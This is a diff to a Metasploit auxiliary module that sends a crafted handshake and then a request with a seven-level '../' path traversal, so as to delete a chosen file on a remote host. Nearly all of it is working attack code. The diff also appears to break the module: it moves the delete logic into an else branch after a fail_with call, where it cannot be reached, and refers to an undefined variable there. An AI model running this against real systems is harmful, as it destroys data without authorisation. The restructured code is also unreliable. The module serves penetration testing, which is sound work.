@@ -7,7 +7,6 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
   prepend Msf::Exploit::Remote::AutoCheck
-  CheckCode = Exploit::CheckCode
 
   def initialize(info = {})
     super(
@@ -53,8 +52,9 @@ class MetasploitModule < Msf::Auxiliary
   def check
     begin
       connect
-    rescue Rex::ConnectionTimeout => e
-      fail_with(Failure::Unreachable, "Connection to #{datastore['RHOSTS']}:#{datastore['RPORT']} failed: #{e.message}")
+    rescue Rex::ConnectionTimeout
+      print_error("Connection to #{datastore['RHOSTS']}:#{datastore['RPORT']} failed.")
+      return CheckCode::Unreachable
     end
 
     vprint_status('Sending handshake...')
@@ -65,11 +65,11 @@ class MetasploitModule < Msf::Auxiliary
     res = sock.get_once(4096, 5)
     expected_header = "\x00\x04\x00\x01\x00\x00\x00\x08".b
 
-    if res && res.start_with?(expected_header)
+    if res&.start_with?(expected_header)
       vprint_status('Received handshake response.')
       vprint_status(Rex::Text.to_hex_dump(res))
       disconnect
-      return CheckCode::Detected
+      return Exploit::CheckCode::Detected
     elsif res
       vprint_status('Received unexpected handshake response:')
       vprint_status(Rex::Text.to_hex_dump(res))
@@ -77,7 +77,7 @@ class MetasploitModule < Msf::Auxiliary
       return Exploit::CheckCode::Safe
     else
       disconnect
-      returnExploit::CheckCode::Unknown('No handshake response received.')
+      return Exploit::CheckCode::Unknown('No handshake response received.')
     end
   end
 
@@ -105,52 +105,49 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::UnexpectedReply, "Failed during handshake send: #{e.class} - #{e.message}")
     end
 
-    begin
-      res = sock.get
-      if res
-        print_status('Received handshake response.')
-        vprint_status(Rex::Text.to_hex_dump(res))
-      else
-        print_error('No handshake response received.')
+    res = sock.get
+    if res
+      print_status('Received handshake response.')
+      vprint_status(Rex::Text.to_hex_dump(res))
+    else
+      print_error('No handshake response received.')
+      fail_with(Failure::Unreachable, "Connection to #{datastore['RHOSTS']}:#{datastore['RPORT']} failed: #{e.message}")
+
+      begin
+        fname = datastore['FILE']
+        traversal = '../' * 7
+        full_fname = traversal + fname
+        full_fname = full_fname.gsub(%r{/+}, '/')
+
+        data = [0xaa].pack('N')
+        data << "unk_str1\x00"
+        data << [1].pack('N')
+        data << full_fname.encode('ASCII') + "\x00"
+
+        req = mk_msg(21, 0x0021, data)
+      rescue StandardError => e
+        fail_with(Failure::BadConfig, "Failed to construct request: #{e.class} - #{e.message}")
       end
-    rescue StandardError => e
-      fail_with(Failure::TimeoutExpired, "Failed to receive handshake response: #{e.class} - #{e.message}")
-    end
 
-    begin
-      fname = datastore['FILE']
-      traversal = '../' * 7
-      full_fname = traversal + fname
-      full_fname = full_fname.gsub(%r{/+}, '/')
+      vprint_status(Rex::Text.to_hex_dump(req))
 
-      data = [0xaa].pack('N')
-      data << "unk_str1\x00"
-      data << [1].pack('N')
-      data << full_fname.encode('ASCII') + "\x00"
+      print_status("Deleting #{fname} from #{datastore['RHOSTS']}")
+      sock.put(req)
 
-      req = mk_msg(21, 0x0021, data)
-    rescue StandardError => e
-      fail_with(Failure::BadConfig, "Failed to construct request: #{e.class} - #{e.message}")
-    end
+      begin
+        res = sock.get
+        if res
 
-    vprint_status(Rex::Text.to_hex_dump(req))
-
-    print_status("Deleting #{fname} from #{datastore['RHOSTS']}")
-    sock.put(req)
-
-    begin
-      res = sock.get
-      if res
-
-        print_good('Received response from target.')
-        vprint_status(Rex::Text.to_hex_dump(res)) if res
-      else
-        print_error('No response received from target.')
+          print_good('Received response from target.')
+          vprint_status(Rex::Text.to_hex_dump(res)) if res
+        else
+          print_error('No response received from target.')
+        end
+      rescue StandardError => e
+        fail_with(Failure::TimeoutExpired, "Failed to receive response: #{e.class} - #{e.message}")
+      ensure
+        disconnect
       end
-    rescue StandardError => e
-      fail_with(Failure::TimeoutExpired, "Failed to receive response: #{e.class} - #{e.message}")
-    ensure
-      disconnect
     end
   end
 end
